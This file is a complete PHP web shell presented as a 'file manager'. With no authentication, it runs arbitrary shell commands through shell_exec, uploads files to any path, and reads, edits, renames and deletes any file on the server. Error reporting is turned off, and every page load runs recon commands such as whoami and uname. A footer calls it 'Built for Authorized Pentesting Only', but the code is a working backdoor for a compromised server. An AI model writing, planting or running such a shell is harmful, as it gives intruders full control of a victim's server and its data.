<?php
error_reporting(0);
@ini_set('display_errors', 0);

// === KAKAR00T FILEMANAGER v2.5 === //
define('VERSION', '2.5');
define('AUTHOR', 'Kakar00t');

// Fungsi aman
function r($f){return @file_get_contents($f);}
function w($f,$c){return @file_put_contents($f,$c);}
function d($p){return @is_dir($p);}
function f($p){return @is_file($p);}
function x($c){return @shell_exec($c);}

// === NAVIGASI DIREKTORI ===
$root = '/';
$dir = realpath(@$_REQUEST['dir'] ?: getcwd());
if(!$dir || !d($dir)) $dir = realpath(getcwd());
@chdir($dir);

$parent = realpath($dir.'/..');

// Ganti direktori
if(isset($_POST['godir'])){
    $new = realpath($_POST['path']);
    if($new && d($new) && strpos($new, $root)===0){
        $dir = $new;
        @chdir($dir);
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kakar00t FileManager v<?php echo VERSION; ?></title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Orbitron:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0d1117;
            --card: #161b22;
            --border: #30363d;
            --text: #f0f6fc;
            --accent: #58a6ff;
            --danger: #f85149;
            --success: #3fb950;
            --warning: #d29922;
            --purple: #bc8cff;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'JetBrains Mono', monospace;
            line-height: 1.6;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: auto; }
        header {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: linear-gradient(135deg, var(--card), #1a1f2e);
            border: 1px solid var(--border);
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .logo {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.5rem;
            background: linear-gradient(45deg, var(--accent), var(--purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        }
        .tagline { font-size: 0.9rem; color: #8b949e; }
        .path-bar {
            background: var(--card);
            padding: 12px 16px;
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .path-bar input { flex: 1; min-width: 200px; }
        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 6px;
            font-family: inherit;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 0.9rem;
        }
        .btn-primary { background: var(--accent); color: white; }
        .btn-secondary { background: var(--card); color: var(--text); border: 1px solid var(--border); }
        .btn-danger { background: var(--danger); color: white; }
        .btn-success { background: var(--success); color: white; }
        .btn:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
        .card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
        }
        input, textarea, select {
            background: #0d1117;
            border: 1px solid var(--border);
            color: var(--text);
            padding: 10px;
            border-radius: 6px;
            font-family: inherit;
            width: 100%;
        }
        textarea { resize: vertical; min-height: 150px; }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }
        th { background: rgba(88,166,255,0.1); color: var(--accent); }
        tr:hover { background: rgba(255,255,255,0.03); }
        a { color: var(--accent); text-decoration: none; }
        a:hover { text-decoration: underline; }
        .actions a { margin-right: 12px; font-size: 0.9rem; }
        .footer {
            text-align: center;
            margin-top: 40px;
            color: #8b949e;
            font-size: 0.8rem;
        }
        .badge {
            background: var(--purple);
            color: white;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 0.7rem;
            font-weight: bold;
        }
        .flex { display: flex; gap: 10px; flex-wrap: wrap; }
        .flex > * { flex: 1; min-width: 280px; }
        @media (max-width: 768px) {
            .flex { flex-direction: column; }
            .logo { font-size: 2rem; }
        }
    </style>
</head>
<body>
<div class="container">

    <!-- HEADER -->
    <header>
        <div class="logo">KAKAR00T</div>
        <div class="tagline">FileManager v<?php echo VERSION; ?> • LiteSpeed Safe Edition</div>
    </header>

    <!-- PATH BAR -->
    <div class="path-bar">
        <form method="post" class="flex" style="align-items:center;">
            <input name="path" placeholder="Enter path: /var/www, /home/user, /etc" value="<?php echo htmlspecialchars($dir); ?>">
            <button type="submit" name="godir" class="btn btn-primary">Go</button>
        </form>
        <div style="margin-top:8px; display:flex; gap:5px; flex-wrap:wrap;">
            <form method="post" style="display:inline;">
                <input type="hidden" name="path" value="<?php echo $root; ?>">
                <button type="submit" name="godir" class="btn btn-secondary">Root (/)</button>
            </form>
            <?php if($parent && $parent != $dir): ?>
            <form method="post" style="display:inline;">
                <input type="hidden" name="path" value="<?php echo $parent; ?>">
                <button type="submit" name="godir" class="btn btn-secondary">.. (Parent)</button>
            </form>
            <?php endif; ?>
        </div>
    </div>

    <div class="flex">

        <!-- COMMAND EXECUTION -->
        <div class="card">
            <h3>Command Terminal <span class="badge">shell_exec</span></h3>
            <form method="post">
                <input name="cmd" placeholder="id; whoami; pwd; uname -a" autofocus>
                <button type="submit" class="btn btn-primary" style="margin-top:8px;">Execute</button>
            </form>
            <?php if(isset($_POST['cmd'])): ?>
            <pre style="background:#000;padding:12px;border-radius:6px;margin-top:10px;max-height:200px;overflow:auto;border:1px solid var(--border);">
<?php echo htmlspecialchars(x($_POST['cmd'])); ?>
            </pre>
            <?php endif; ?>
        </div>

        <!-- UPLOAD FILE -->
        <div class="card">
            <h3>Upload File</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file" required>
                <input name="uppath" placeholder="Destination (optional)" value="<?php echo htmlspecialchars($dir); ?>">
                <button type="submit" class="btn btn-success" style="margin-top:8px;">Upload</button>
            </form>
            <?php
            if(isset($_FILES['file']) && $_FILES['file']['error']==0){
                $dest = $_POST['uppath'] ? rtrim($_POST['uppath'],'/').'/' : $dir.'/';
                $dest .= $_FILES['file']['name'];
                if(move_uploaded_file($_FILES['file']['tmp_name'], $dest)){
                    echo "<p style='color:var(--success);margin-top:10px;'>Uploaded: <code>$dest</code></p>";
                } else echo "<p style='color:var(--danger);'>Upload failed!</p>";
            }
            ?>
        </div>

    </div>

    <!-- FILE LIST -->
    <div class="card">
        <h3>Directory: <code><?php echo htmlspecialchars($dir); ?></code></h3>
        <table>
            <tr><th>Name</th><th>Size</th><th>Perms</th><th>Type</th><th class="actions">Actions</th></tr>
            <?php
            $files = @scandir($dir);
            if($files) foreach($files as $file){
                if($file=='.' || $file=='..') continue;
                $path = $dir.'/'.$file;
                $size = f($path) ? formatBytes(filesize($path)) : '-';
                $perm = substr(sprintf('%o', fileperms($path)), -4);
                $type = f($path) ? 'file' : (d($path) ? 'dir' : 'unknown');
                $url = urlencode($path);
                $isDir = d($path);
                echo "<tr>
                <td><a href='?dir=$url' style='color:".($isDir?'var(--purple)': 'var(--accent)').";'>".($isDir?'<b>📁 ':'')."$file</a></td>
                <td>$size</td>
                <td><code>$perm</code></td>
                <td><span class='badge' style='background:".($isDir?'var(--purple)': 'var(--accent)').";'>$type</span></td>
                <td class='actions'>
                    <a href='?edit=$url&dir=".urlencode($dir)."'>Edit</a> |
                    <a href='?rename=$url&dir=".urlencode($dir)."'>Rename</a> |
                    <a href='?del=$url&dir=".urlencode($dir)."' onclick='return confirm(\"Delete $file?\")' style='color:var(--danger);'>Delete</a>
                </td></tr>";
            }
            ?>
        </table>
    </div>

    <!-- EDIT FILE -->
    <?php if(isset($_GET['edit'])){ $file = $_GET['edit']; if(f($file)): ?>
    <div class="card">
        <h3>Edit File: <code><?php echo htmlspecialchars($file); ?></code></h3>
        <form method="post">
            <textarea name="content"><?php echo htmlspecialchars(r($file)); ?></textarea>
            <input type="hidden" name="file" value="<?php echo $file; ?>">
            <input type="hidden" name="dir" value="<?php echo urlencode($dir); ?>">
            <button name="save" class="btn btn-success" style="margin-top:10px;">Save Changes</button>
        </form>
    </div>
    <?php endif; } ?>

    <!-- RENAME FILE -->
    <?php if(isset($_GET['rename'])){ $file = $_GET['rename']; if(f($file) || d($file)): ?>
    <div class="card">
        <h3>Rename / Move</h3>
        <form method="post">
            <input name="old" value="<?php echo $file; ?>" readonly style="margin-bottom:8px;">
            <input name="new" placeholder="New name or full path" required>
            <input type="hidden" name="dir" value="<?php echo urlencode($dir); ?>">
            <button name="doren" class="btn btn-primary" style="margin-top:8px;">Apply</button>
        </form>
    </div>
    <?php endif; } ?>

    <!-- SAVE & RENAME ACTIONS -->
    <?php
    if(isset($_POST['save'])){
        if(w($_POST['file'], $_POST['content'])){
            echo "<div class='card' style='border-color:var(--success);'><p style='color:var(--success);'>File saved successfully!</p></div>";
        }
    }
    if(isset($_POST['doren'])){
        if(@rename($_POST['old'], $_POST['new'])){
            echo "<div class='card' style='border-color:var(--success);'><p style='color:var(--success);'>Renamed/Moved!</p></div>";
        } else {
            echo "<div class='card' style='border-color:var(--danger);'><p style='color:var(--danger);'>Failed!</p></div>";
        }
    }
    if(isset($_GET['del'])){
        $target = $_GET['del'];
        if(f($target)) @unlink($target);
        elseif(d($target)) @rmdir($target);
        header("Location: ?dir=".urlencode($dir));
        exit;
    }
    ?>

    <!-- FOOTER -->
    <div class="footer">
        <p>© <?php echo date('Y'); ?> <b>Kakar00t FileManager</b> • Built for Authorized Pentesting Only</p>
        <p>Server: <code><?php echo htmlspecialchars(x('uname -a')); ?></code> | User: <code><?php echo htmlspecialchars(x('whoami')); ?></code></p>
    </div>

</div>

<?php
function formatBytes($size, $precision = 2) {
    $base = log($size, 1024);
    $suffixes = array('B', 'KB', 'MB', 'GB', 'TB');
    return round(pow(1024, $base - floor($base)), $precision) .' '. $suffixes[floor($base)];
}
?>
</body>
</html>